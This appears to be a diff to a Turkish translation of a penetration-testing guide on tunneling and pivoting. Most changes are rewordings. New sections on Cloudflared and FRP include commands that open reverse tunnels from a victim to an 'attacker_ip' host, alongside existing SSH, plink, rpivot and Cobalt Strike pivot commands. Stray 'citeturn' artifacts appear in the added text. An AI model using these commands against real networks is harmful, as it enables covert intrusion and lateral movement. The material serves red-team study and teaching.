@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Yerel port --> Ele geçirilmiş host (SSH) --> Üçüncü_kutu:Port
+Yerel port --> Ele geçirilmiş ana bilgisayar (SSH) --> Üçüncü_kutu:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tüneli
 
-Her iki cihazda da **root erişimine** ihtiyacınız var (çünkü yeni arayüzler oluşturacaksınız) ve sshd yapılandırmasının root girişine izin vermesi gerekiyor:\
+Her iki cihazda da **root erişimine ihtiyacınız var** (çünkü yeni arayüzler oluşturacaksınız) ve sshd yapılandırması root girişine izin vermelidir:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -78,7 +78,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Sunucu tarafında yönlendirmeyi etkinleştirin
+Sunucu tarafında yönlendirmeyi etkinleştir.
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -87,10 +87,14 @@ iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
+> [!NOTE]
+> **Güvenlik – Terrapin Saldırısı (CVE-2023-48795)**
+> 2023 Terrapin geri alma saldırısı, bir adam-arada saldırganın erken SSH el sıkışmasını değiştirmesine ve **herhangi bir yönlendirilmiş kanala** veri enjekte etmesine olanak tanıyabilir ( `-L`, `-R`, `-D` ). Hem istemcinin hem de sunucunun yamanmış olduğundan emin olun (**OpenSSH ≥ 9.6/LibreSSH 6.7**) veya SSH tünellerine güvenmeden önce savunmasız `chacha20-poly1305@openssh.com` ve `*-etm@openssh.com` algoritmalarını `sshd_config`/`ssh_config` içinde açıkça devre dışı bırakın. citeturn4search0
+
 ## SSHUTTLE
 
-Bir **host** üzerinden bir **alt ağ**'a tüm **trafik**i **ssh** ile **tünelleme** yapabilirsiniz.\
-Örneğin, 10.10.10.0/24 adresine giden tüm trafiği yönlendirmek.
+Bir ana bilgisayar üzerinden **ssh** ile **alt ağ**'a giden tüm **trafik** için **tünel** oluşturabilirsiniz.\
+Örneğin, 10.10.10.0/24'e giden tüm trafiği yönlendirmek
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -145,7 +149,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> Bu durumda, **port beacon ana bilgisayarında açılır**, Team Server'da değil ve trafik Team Server'a gönderilir ve oradan belirtilen host:port'a iletilir.
+> Bu durumda, **port beacon host'ta açılır**, Team Server'da değil ve trafik Team Server'a gönderilir ve oradan belirtilen host:port'a iletilir.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -153,7 +157,7 @@ rportfwd stop [bind port]
 Not edilmesi gerekenler:
 
 - Beacon'ın ters port yönlendirmesi, **bireysel makineler arasında iletim için değil, Team Server'a trafik tünellemek için tasarlanmıştır**.
-- Trafik, **Beacon'ın C2 trafiği içinde tünellenir**, P2P bağlantıları da dahil.
+- Trafik, **Beacon'ın C2 trafiği içinde tünellenir**, P2P bağlantıları dahil.
 - Yüksek portlarda ters port yönlendirmeleri oluşturmak için **yönetici ayrıcalıkları gerekmez**.
 
 ### rPort2Port yerel
@@ -237,7 +241,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Ters tünel. Tünel kurban tarafından başlatılır.\
+Ters tünel. Tünel, kurban tarafından başlatılır.\
 127.0.0.1:1080 adresinde bir socks4 proxy oluşturulur.
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -320,9 +324,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Konsol PuTTY versiyonu gibidir (seçenekler bir ssh istemcisine çok benzer).
+Konsol PuTTY versiyonuna benzer (seçenekler bir ssh istemcisine çok benzer).
 
-Bu ikili dosya kurban üzerinde çalıştırılacağı için ve bir ssh istemcisi olduğu için, ters bağlantı kurabilmemiz için ssh hizmetimizi ve portumuzu açmamız gerekiyor. Ardından, yalnızca yerel olarak erişilebilir bir portu makinemizdeki bir porta yönlendirmek için:
+Bu ikili dosya kurban üzerinde çalıştırılacağından ve bir ssh istemcisi olduğundan, ters bağlantı kurabilmemiz için ssh hizmetimizi ve portumuzu açmamız gerekiyor. Ardından, yalnızca yerel olarak erişilebilir bir portu makinemizdeki bir porta yönlendirmek için:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -343,7 +347,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-**Sisteme RDP erişiminiz olmalıdır**.\
+**Sisteme RDP erişiminiz olmalıdır.**\
 İndirin:
 
 1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç, Windows'un Uzak Masaüstü Servisi özelliğinden `Dynamic Virtual Channels` (`DVC`) kullanır. DVC, **RDP bağlantısı üzerinden paketleri tünellemekten** sorumludur.
@@ -392,14 +396,14 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Şimdi, örneğin kurbanın **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Buna saldırganın 2222 numaralı portu üzerinden bağlanabilirsiniz.\
+Şimdi, örneğin kurbanın **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Saldırgan 2222 numaralı port üzerinden buna bağlanabilirsiniz.\
 Ayrıca, localhost:443'e bağlanan bir **meterpreter** kullanabilir ve saldırgan 2222 numaralı portta dinliyor olabilir.
 
 ## YARP
 
 Microsoft tarafından oluşturulmuş bir ters proxy. Bunu burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
-## DNS Tunneling
+## DNS Tünelleme
 
 ### Iodine
 
@@ -514,7 +518,7 @@ _Gerekirse kimlik doğrulama ve TLS eklemek de mümkündür._
 #### HTTP çağrılarını dinleme
 
 _XSS, SSRF, SSTI ... için faydalıdır._\
-Stdout'tan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000) doğrudan.
+stdout'dan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000) doğrudan.
 
 #### Dahili HTTP hizmetini tünelleme
 ```bash
@@ -541,7 +545,72 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
-## Diğer kontrol araçları
+## Cloudflared (Cloudflare Tüneli)
+
+Cloudflare’ın `cloudflared` daemon'u, **yerel TCP/UDP hizmetlerini** dışa açan tüneller oluşturabilir ve bu, Cloudflare’ın kenarını buluşma noktası olarak kullanarak, gelen güvenlik duvarı kurallarına ihtiyaç duymadan yapılır. Bu, çıkış güvenlik duvarının yalnızca HTTPS trafiğine izin verdiği ancak gelen bağlantıların engellendiği durumlarda oldukça kullanışlıdır.
+
+### Hızlı tünel tek satır komutu
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+### SOCKS5 pivot
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+### DNS ile Kalıcı Tüneller
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+Bağlayıcıyı başlatın:
+```bash
+cloudflared tunnel run mytunnel
+```
+Çünkü tüm trafik **443 üzerinden dışa çıkıyor**, Cloudflared tünelleri, giriş ACL'lerini veya NAT sınırlarını aşmanın basit bir yoludur. İlgili binary'nin genellikle yükseltilmiş ayrıcalıklarla çalıştığını unutmayın – mümkünse konteynerler veya `--user` bayrağını kullanın. citeturn1search0
+
+## FRP (Hızlı Ters Proxy)
+
+[`frp`](https://github.com/fatedier/frp) **TCP, UDP, HTTP/S, SOCKS ve P2P NAT-delik-delme** destekleyen aktif olarak bakım yapılan bir Go ters proxy'dir. **v0.53.0 (Mayıs 2024)** ile birlikte, bir **SSH Tünel Geçidi** olarak işlev görebilir, böylece bir hedef ana bilgisayar yalnızca stok OpenSSH istemcisini kullanarak ters bir tünel açabilir – ek bir binary gerekmiyor.
+
+### Klasik ters TCP tüneli
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+### Yeni SSH geçidini kullanma (frpc ikili dosyası yok)
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+Yukarıdaki komut, kurbanın portunu **8080** **attacker_ip:9000** olarak yayınlar ve ek bir araç dağıtmadan – living-off-the-land pivoting için idealdir. citeturn2search1
+
+## Kontrol edilecek diğer araçlar
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
